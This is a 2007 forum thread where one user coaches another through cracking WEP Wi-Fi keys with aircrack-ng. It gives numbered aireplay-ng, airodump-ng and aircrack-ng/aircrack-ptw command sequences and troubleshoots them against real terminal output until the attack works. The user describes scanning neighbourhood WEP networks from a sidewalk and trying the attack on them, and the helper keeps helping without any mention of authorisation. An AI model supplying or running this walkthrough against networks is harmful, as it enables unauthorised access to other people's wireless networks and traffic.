---
title: "aircrack help stuck on aireplay step"
date: 2007-06-18
forum: Networking &amp; Wireless
---

### Post by ssc351 on 2007-06-18
Hey guys,

Im following this tutorial [http://www.aircrack-ng.org/doku.php?id=simple_wep_crack](http://www.aircrack-ng.org/doku.php?id=simple_wep_crack) and when i get to the step where I need to use the aireplay-ng command, in the terminal it just says "waiting for beacon".  Everything goes exactly according to the tutorial up to this point.  I am pretty sure i have everything installed correctly, including the patched drivers, and I am pretty sure I have all the MAC's correct.  But since I am a newbie who knows.  Any info you need let me know and I will show you the outputs.  Thanks for the help!

---

### Post by tturrisi on 2007-06-18
If you have patched drivers, and ran the previous commands correctly and are certain that injection is working, then it will all work well.  Sometimes you must wait 2-3 minutes for injection to begin.

What version of aircrack-ng are you using.  DON'T use the one in the ubuntu repos as I believe it's old, use the latest stable version from the aircrack-ng site:
```

cd /usr/src
wget http://download.aircrack-ng.org/aircrack-ng-0.9.tar.gz
 tar -zxvf aircrack-ng-0.9.tar.gz
 cd aircrack-ng-0.9
 make
 make install
```

Then don't use that guide you linked to, do it like this: (for madwifi)
```
1. airmon-ng stop ath0
2. airmon-ng start wifi0 11
3. ifconfig ath0 up 9or use ath1, ath2, ath3, etc as needed)
4. aireplay-ng -1 0 -e SSID-NAME-HERE -a AP-MAC_HERE -h ADAPTER-MAC-HERE ath0
5. airodump-ng -c 11 --SSID-NAME-HERE  AP-MAC_HERE --ivs -w output ath0  (in new window)
5b. or use: airodump-ng -c 11 --SSID-NAME-HERE  AP-MAC_HERE -w output ath0 (removes --ivs for 7b.)
6. aireplay-ng -3 -b AP-MAC_HERE -h ADAPTER-MAC-HERE ath0  (in new window)
7. aircrack-ng -b SSID-NAME-HERE output*.ivs  (in new window)
7b. or use: aircrack-ptw output-01.cap
```

the aircrack-ptw method is the best & fastest.  (5b & 7b)

---

### Post by ssc351 on 2007-06-18
Okay, still the same deal here is the output when i get to the aireplay step:

The interface MAC (06:16:E6:3D:01:41) doesn't match the specified MAC (-h).
        ifconfig ath0 hw ether 00:16:E6:3D:01:41
14:34:30  Waiting for beacon frame (BSSID: 00:14:A5:88:4D:14)

Also, I noticed after the airmon-ng start athX step, then I do ifconfig athX up, then I do an iwconfig, there is no MAC AP.  It says its in Monitor Mode, but its not doing the same as the tutorial.  Is this my problem?  Also, I am fairly positive my MAC addresses are correct.

---

### Post by tturrisi on 2007-06-18
iwlist ath0 scan
will show you the AP mac address

ifconfig
will show your the ath0 mac address

---

### Post by ssc351 on 2007-06-19
Ya that's what I did....looking through it again, for whatever reason on my wireless card mac it reads "00:16:E6:3D:01:41" but then on the aireplay it reads The interface MAC (06:16:E6:3D:01:41) doesn't match the specified MAC (-h).
ifconfig ath0 hw ether 00:16:E6:3D:01:41
14:34:30 Waiting for beacon frame (BSSID: 00:14:A5:88:4D:14)


Note the interface MAC starts with 06...I definitely typed it in correctly so why is it changing it to 06:16:E6:3D:01:41 instead of 00:16:E6:3D:01:41 when it goes to execute the aireplay command?

---

### Post by tturrisi on 2007-06-19
> **ssc351 said:**
> Ya that's what I did....looking through it again, for whatever reason on my wireless card mac it reads "00:16:E6:3D:01:41" but then on the aireplay it reads The interface MAC (06:16:E6:3D:01:41) doesn't match the specified MAC (-h).
ifconfig ath0 hw ether 00:16:E6:3D:01:41
14:34:30 Waiting for beacon frame (BSSID: 00:14:A5:88:4D:14)


Note the interface MAC starts with 06...I definitely typed it in correctly so why is it changing it to 06:16:E6:3D:01:41 instead of 00:16:E6:3D:01:41 when it goes to execute the aireplay command?

Not sure why, but try following the steps I posted above, & if no joy, use that other mac address & see what gives.

---

### Post by ssc351 on 2007-06-20
Ya I tried everything...followed the tutorial, followed your steps, tried the starting 06:.... MAC address. Still no dice. I am still wondering about after putting the card into monitor mode and then running ifconfig ath0 up and then iwconfig and not getting anything is that my problem?  Any other possible issues?

---

### Post by ssc351 on 2007-06-27
Again my problem has got to be with the MAC address not coming up on the wireless card after the ifconfig ath0 up step.  Here are my ifconfig and iwconfig...what gives...also again noticed the MAC address on my wireless card and how it starts with 06

 iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wifi0     no wireless extensions.

ath0      IEEE 802.11g  ESSID:""  Nickname:""
          Mode:Monitor  Frequency:2.412 GHz  Access Point: Not-Associated   
          Bit Rate:0 kb/s   Tx-Power:19 dBm   Sensitivity=1/1  
          Retry:off   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality=0/70  Signal level=-95 dBm  Noise level=-95 dBm
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

travis@dell640m:~$ ifconfig
ath0      Link encap:UNSPEC  HWaddr 06-16-E6-3D-01-41-40-E2-00-00-00-00-00-00-00-00  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)

eth0      Link encap:Ethernet  HWaddr 00:15:C5:6F:27:4C  
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
          Interrupt:17 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:100 (100.0 b)  TX bytes:100 (100.0 b)

wifi0     Link encap:UNSPEC  HWaddr 00-16-E6-3D-01-41-00-00-00-00-00-00-00-00-00-00  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:33223 errors:0 dropped:0 overruns:0 frame:2633
          TX packets:5763 errors:27 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:199 
          RX bytes:8221302 (7.8 MiB)  TX bytes:936879 (914.9 KiB)
          Interrupt:17

---

### Post by tturrisi on 2007-06-28
post the output in the term from these 2 commands:
airmon-ng stop ath0
airmon-ng start wifi0 11

---

### Post by ssc351 on 2007-06-28
sudo airmon-ng stop ath0
Password:


Interface       Chipset         Driver

wifi0           Atheros         madwifi-ng
ath0            Atheros         madwifi-ng VAP (parent: wifi0) (VAP destroyed)


sudo airmon-ng start wifi0 11


Interface       Chipset         Driver

wifi0           Atheros         madwifi-ngError for wireless request "Set Frequency" (8B04) :
    SET failed on device ath0 ; No such device.
ath0: ERROR while getting interface flags: No such device

ath1            Atheros         madwifi-ng VAP (parent: wifi0)


Also, note that I keep getting different outputs for the airmon-ng start wifi0 command....sometimes i get what is posted above and sometimes I get the exact same output as is posted in the tutorial on the aircrack website.  (something along the lines of: ath0 Atheros (monitor mode enabled))  Either output does not work once i get to the aireplay step.

---

### Post by tturrisi on 2007-06-28
When you see this:
ath1 Atheros madwifi-ng VAP (parent: wifi0)
you need to do:
ifconfig ath1 up (not ath0).
then do:
4. aireplay-ng -1 0 -e SSID-NAME-HERE -a AP-MAC_HERE -h ADAPTER-MAC-HERE ath0
5. airodump-ng -c 11 --SSID-NAME-HERE  AP-MAC_HERE --ivs -w output ath0  (in new window)
5b. OR use: airodump-ng -c 11 --SSID-NAME-HERE  AP-MAC_HERE -w output ath0 (removes --ivs for 7b.)
6. aireplay-ng -3 -b AP-MAC_HERE -h ADAPTER-MAC-HERE ath0  (in new window)
7. aircrack-ng -b SSID-NAME-HERE output*.ivs  (in new window)
7b. OR use: aircrack-ptw output-01.cap

---

### Post by ssc351 on 2007-06-28
Ok, I got past the aireplay step then got stuck on the airodump step...i kept getting an error saying invalid netmask...tried both step 5 and 5b...ath0 ath1...etc and always got the same error.

I continued on to step 6 and it seemed to work, but it said I should run airodump to capture packets so i assume that is because step 5 failed...then step 7 didn't work either.

---

### Post by tturrisi on 2007-06-29
> **ssc351 said:**
> Ok, I got past the aireplay step then got stuck on the airodump step...i kept getting an error saying invalid netmask...tried both step 5 and 5b...ath0 ath1...etc and always got the same error.

I continued on to step 6 and it seemed to work, but it said I should run airodump to capture packets so i assume that is because step 5 failed...then step 7 didn't work either.

It always says, " you  should run airodump to capture packets".  Injection may take up to 5 minutes to begin, depending on how many arp packets get captured in the previous step.

I'm curious, how did you go about installing the madwifi drivers and then patch them to work w/ aircrack-ng?

---

### Post by ssc351 on 2007-07-01
Ahh, I did not realized it took that along...as far as install goes...I followed one of your previous posts about how install and patch it.

Another thing of interest that has been happening...I went up the block and just sat on the sidewalk and scanned to see what WEP's there were...it seems like any networks on Channel 1...the aireplay step will not work. Then a lot times, any other WEP on any other channel other than 1 works very inconsistently on the aireplay step.  It just says "waiting for beacon"  Does this step also take a few minutes?  

Any thoughts?  Does it have anything to do with the strength of the signal?  It also seems like an sigal under 15/70 or so drops in and out.  Is that a function of my card or is that normal? I have a Gigabyte mini pci-express card.

---

### Post by ssc351 on 2007-07-02
Here is the other error I get after the airodump-ng step:

Notice: Channel range already given
airodump-ng: invalid option -- v
"airodump-ng --help" for help.

---

### Post by tturrisi on 2007-07-02
Are you still trying to use that simple-wep-crack howto at the aircrack-ng site?  Don't follow that guide, it is incorrect.  Do the steps I gave above.

Yes, you need a decent signal because you have to associate w/ the ap and grab packets.  With a poor signal you'll wait forever to get beacons!

---

### Post by ssc351 on 2007-07-03
Alright Finally Got it!  The problem was on step 5 of your guide it should be
 airodump-ng -c 11 --bssid AP-MAC_HERE --ivs -w output ath0

The other thing I didn't realize is that 11 is the channel number, I kept screwing that up as well.

Thanks for all the help!

---

### Post by tturrisi on 2007-07-03
Glad you got it working.
Now try the -ptw steps!

---

